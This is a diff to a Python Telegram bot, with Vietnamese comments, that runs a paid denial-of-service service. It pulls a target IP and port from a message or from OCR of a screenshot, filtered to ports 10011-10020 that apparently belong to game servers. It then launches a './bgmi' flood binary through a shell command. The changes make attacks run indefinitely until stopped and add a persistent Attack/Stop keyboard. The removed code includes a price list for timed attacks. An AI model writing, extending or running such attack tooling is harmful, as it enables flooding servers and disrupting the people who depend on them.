@@ -51,6 +51,18 @@ def record_command_logs(user_id, command, target=None, port=None, time=None):
     with open(LOG_FILE, "a") as file:
         file.write(log_entry + "\n")
 
+# ---------------- Regex Detect IP:PORT ----------------
+def extract_ip_port(text):
+    matches = re.findall(r'(\d{1,3}(?:\.\d{1,3}){3})\D+(\d{2,5})', text)
+    valid = [(ip, int(port)) for ip, port in matches if 10011 <= int(port) <= 10020]
+    return valid
+
+# ---------------- Luôn hiện Keyboard ----------------
+def main_keyboard():
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.row("🚀 Attack", "⛔ Stop")
+    return markup
+
 # ---------------- Admin Commands ----------------
 @bot.message_handler(commands=['add'])
 def add_user(message):
@@ -63,13 +75,13 @@ def add_user(message):
                 allowed_user_ids.append(new_user)
                 with open(USER_FILE, "a") as f:
                     f.write(f"{new_user}\n")
-                bot.reply_to(message, f"User {new_user} added ✅")
+                bot.reply_to(message, f"User {new_user} added ✅", reply_markup=main_keyboard())
             else:
-                bot.reply_to(message, "User already exists ❌")
+                bot.reply_to(message, "User already exists ❌", reply_markup=main_keyboard())
         else:
-            bot.reply_to(message, "Usage: /add <userid>")
+            bot.reply_to(message, "Usage: /add <userid>", reply_markup=main_keyboard())
     else:
-        bot.reply_to(message, "Only Admin ❌")
+        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
@@ -82,21 +94,21 @@ def remove_user(message):
                 allowed_user_ids.remove(uid)
                 with open(USER_FILE, "w") as f:
                     for u in allowed_user_ids: f.write(f"{u}\n")
-                bot.reply_to(message, f"User {uid} removed ✅")
+                bot.reply_to(message, f"User {uid} removed ✅", reply_markup=main_keyboard())
             else:
-                bot.reply_to(message, f"User {uid} not found ❌")
+                bot.reply_to(message, f"User {uid} not found ❌", reply_markup=main_keyboard())
         else:
-            bot.reply_to(message, "Usage: /remove <userid>")
+            bot.reply_to(message, "Usage: /remove <userid>", reply_markup=main_keyboard())
     else:
-        bot.reply_to(message, "Only Admin ❌")
+        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())
 
 @bot.message_handler(commands=['clearlogs'])
 def clear_logs_command(message):
     if str(message.chat.id) in admin_id:
         open(LOG_FILE, "w").close()
-        bot.reply_to(message, "Logs cleared ✅")
+        bot.reply_to(message, "Logs cleared ✅", reply_markup=main_keyboard())
     else:
-        bot.reply_to(message, "Only Admin ❌")
+        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
@@ -105,13 +117,13 @@ def show_all_users(message):
             with open(USER_FILE, "r") as f:
                 data = f.read().splitlines()
                 if data:
-                    bot.reply_to(message, "Users:\n" + "\n".join(data))
+                    bot.reply_to(message, "Users:\n" + "\n".join(data), reply_markup=main_keyboard())
                 else:
-                    bot.reply_to(message, "No users ❌")
+                    bot.reply_to(message, "No users ❌", reply_markup=main_keyboard())
         except:
-            bot.reply_to(message, "No users ❌")
+            bot.reply_to(message, "No users ❌", reply_markup=main_keyboard())
     else:
-        bot.reply_to(message, "Only Admin ❌")
+        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())
 
 @bot.message_handler(commands=['logs'])
 def show_logs(message):
@@ -120,127 +132,40 @@ def show_logs(message):
             with open(LOG_FILE, "rb") as f:
                 bot.send_document(message.chat.id, f)
         else:
-            bot.reply_to(message, "No logs ❌")
+            bot.reply_to(message, "No logs ❌", reply_markup=main_keyboard())
     else:
-        bot.reply_to(message, "Only Admin ❌")
+        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())
 
 # ---------------- User Commands ----------------
 @bot.message_handler(commands=['id'])
 def show_id(message):
-    bot.reply_to(message, f"ID Telegram của bạn là: {message.chat.id}")
+    bot.reply_to(message, f"ID Telegram của bạn là: {message.chat.id}", reply_markup=main_keyboard())
 
-bgmi_cooldown = {}
-
-@bot.message_handler(commands=['bgmi'])
-def handle_bgmi(message):
-    global bgmi_process
-    uid = str(message.chat.id)
-    if uid not in allowed_user_ids:
-        bot.reply_to(message, "❌ Unauthorized")
-        return
-
-    command = message.text.split()
-    if len(command) == 4:
-        target, port, time = command[1], int(command[2]), int(command[3])
-        if time > 181:
-            bot.reply_to(message, "⚠️ Max time 181s")
-            return
-
-        record_command_logs(uid, '/bgmi', target, port, time)
-        log_command(uid, target, port, time)
-        bot.reply_to(message, f"🔥 Attack Started!\n{target}:{port} for {time}s")
-
-        full_cmd = f"./bgmi {target} {port} {time} 200"
-        bgmi_process = subprocess.Popen(full_cmd, shell=True, preexec_fn=os.setsid)
-    else:
-        bot.reply_to(message, "Usage: /bgmi <IP> <PORT> <TIME>")
-
-@bot.message_handler(commands=['stop'])
-def stop_bgmi(message):
-    global bgmi_process
-    if bgmi_process and bgmi_process.poll() is None:
-        os.killpg(os.getpgid(bgmi_process.pid), signal.SIGTERM)
-        bgmi_process = None
-        bot.reply_to(message, "✅ Attack stopped")
-    else:
-        bot.reply_to(message, "⚠️ No running attack")
-
-@bot.message_handler(commands=['mylogs'])
-def mylogs(message):
-    uid = str(message.chat.id)
-    if uid not in allowed_user_ids:
-        bot.reply_to(message, "❌ Unauthorized")
-        return
-    try:
-        with open(LOG_FILE, "r") as f:
-            logs = [l for l in f if f"UserID: {uid}" in l]
-            bot.reply_to(message, "Your logs:\n" + "".join(logs) if logs else "No logs ❌")
-    except:
-        bot.reply_to(message, "No logs ❌")
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    bot.reply_to(message, f"👋 Welcome {message.from_user.first_name}\nUse /help", reply_markup=main_keyboard())
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
     bot.reply_to(message, '''🤖 Commands:
-💥 /bgmi <IP> <PORT> <TIME>
-💥 /stop - Stop running attack
-💥 /mylogs - View your logs
-💥 /rules - Usage rules
-💥 /plan - Pricing
+💥 Send IP:PORT or image to detect target
+💥 🚀 Attack - Start attack until stopped
+💥 ⛔ Stop - Stop running attack
+''', reply_markup=main_keyboard())
 
-Admin:
-💥 /add, /remove, /allusers, /logs, /clearlogs, /broadcast
-''')
-
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
-    bot.reply_to(message, f"👋 Welcome {message.from_user.first_name}\nUse /help")
-
-@bot.message_handler(commands=['rules'])
-def rules(message):
-    bot.reply_to(message, "⚠️ Rules:\n1. Don't spam\n2. Don't run 2 attacks at once\n3. Logs checked daily")
-
-@bot.message_handler(commands=['plan'])
-def plan(message):
-    bot.reply_to(message, "VIP 🌟: 180s attack, 5min cooldown, 3 concurrent\n1day=15k, 3days=40k")
-
-@bot.message_handler(commands=['admincmd'])
-def admincmd(message):
-    bot.reply_to(message, "Admin: /add, /remove, /allusers, /logs, /broadcast, /clearlogs")
-
-@bot.message_handler(commands=['broadcast'])
-def broadcast(message):
-    if str(message.chat.id) in admin_id:
-        parts = message.text.split(maxsplit=1)
-        if len(parts) > 1:
-            msg = "⚠️ Admin Broadcast:\n\n" + parts[1]
-            with open(USER_FILE, "r") as f:
-                for uid in f.read().splitlines():
-                    try: bot.send_message(uid, msg)
-                    except: pass
-            bot.reply_to(message, "Broadcast sent ✅")
-        else:
-            bot.reply_to(message, "Usage: /broadcast <msg>")
-    else:
-        bot.reply_to(message, "Only Admin ❌")
-
-# ---------------- Inline Keyboard (IP:PORT) ----------------
-@bot.message_handler(func=lambda m: ":" in m.text and m.text.count(".") == 3)
+# ---------------- Detect target khi gõ text ----------------
+@bot.message_handler(func=lambda m: True, content_types=['text'])
 def detect_target(message):
     global last_target
-    try:
-        ip, port = message.text.split(":")
-        ip, port = ip.strip(), int(port.strip())
+    if message.text in ["🚀 Attack", "⛔ Stop"]:
+        handle_buttons(message)
+        return
+
+    valid = extract_ip_port(message.text)
+    if valid:
+        ip, port = valid[0]
         last_target = (ip, port)
-
-        markup = types.InlineKeyboardMarkup()
-        markup.add(
-            types.InlineKeyboardButton("🚀 Attack", callback_data="attack"),
-            types.InlineKeyboardButton("⛔ Stop", callback_data="stop")
-        )
-
-        bot.reply_to(message, f"🎯 Target Detected:\n{ip}:{port}\n\nChoose action:", reply_markup=markup)
-    except:
-        bot.reply_to(message, "⚠️ Invalid format. Use IP:PORT")
+        bot.reply_to(message, f"🎯 Target Detected:\n{ip}:{port}", reply_markup=main_keyboard())
 
 # ---------------- OCR từ ảnh ----------------
 @bot.message_handler(content_types=['photo'])
@@ -256,51 +181,36 @@ def handle_photo(message):
         img = Image.open("temp.jpg")
         text = pytesseract.image_to_string(img)
 
-        matches = re.findall(r'(\\d{1,3}(?:\\.\\d{1,3}){3})[: ](\\d+)', text)
-
-        if not matches:
-            bot.reply_to(message, "❌ Không tìm thấy IP:PORT trong ảnh.")
-            return
-
-        valid = [(ip, int(port)) for ip, port in matches if 10011 <= int(port) <= 10020]
-
+        valid = extract_ip_port(text)
         if valid:
             ip, port = valid[0]
             last_target = (ip, port)
-
-            markup = types.InlineKeyboardMarkup()
-            markup.add(
-                types.InlineKeyboardButton("🚀 Attack", callback_data="attack"),
-                types.InlineKeyboardButton("⛔ Stop", callback_data="stop")
-            )
-
-            bot.reply_to(message, f"🎯 Target Detected (OCR):\n{ip}:{port}", reply_markup=markup)
+            bot.reply_to(message, f"🎯 Target Detected (OCR):\n{ip}:{port}", reply_markup=main_keyboard())
         else:
-            bot.reply_to(message, "❌ Không có IP nào trong khoảng 10011-10020.")
+            bot.reply_to(message, "❌ Không có IP nào trong khoảng 10011-10020.", reply_markup=main_keyboard())
 
         os.remove("temp.jpg")
     except Exception as e:
-        bot.reply_to(message, f"Lỗi OCR: {e}")
+        bot.reply_to(message, f"Lỗi OCR: {e}", reply_markup=main_keyboard())
 
-@bot.callback_query_handler(func=lambda call: True)
-def inline_buttons(call):
+# ---------------- Handle nút Attack / Stop ----------------
+def handle_buttons(message):
     global last_target, bgmi_process
-    if call.data == "attack":
+    if message.text == "🚀 Attack":
         if not last_target:
-            bot.answer_callback_query(call.id, "❌ No target")
+            bot.reply_to(message, "❌ No target set", reply_markup=main_keyboard())
             return
         ip, port = last_target
-        time = 60  # mặc định 60s
-        full_cmd = f"./bgmi {ip} {port} {time} 200"
+        full_cmd = f"./bgmi {ip} {port} 0 200"  # 0 = chạy vô hạn
         bgmi_process = subprocess.Popen(full_cmd, shell=True, preexec_fn=os.setsid)
-        bot.send_message(call.message.chat.id, f"🔥 Attack Started!\n{ip}:{port}")
-    elif call.data == "stop":
+        bot.reply_to(message, f"🔥 Attack Started!\n{ip}:{port}\n⏱️ Running until stopped...", reply_markup=main_keyboard())
+    elif message.text == "⛔ Stop":
         if bgmi_process and bgmi_process.poll() is None:
             os.killpg(os.getpgid(bgmi_process.pid), signal.SIGTERM)
             bgmi_process = None
-            bot.send_message(call.message.chat.id, "✅ Attack stopped")
+            bot.reply_to(message, "✅ Attack stopped", reply_markup=main_keyboard())
         else:
-            bot.send_message(call.message.chat.id, "⚠️ No running attack")
+            bot.reply_to(message, "⚠️ No running attack", reply_markup=main_keyboard())
 
 # ---------------- Run Bot ----------------
 bot.polling()
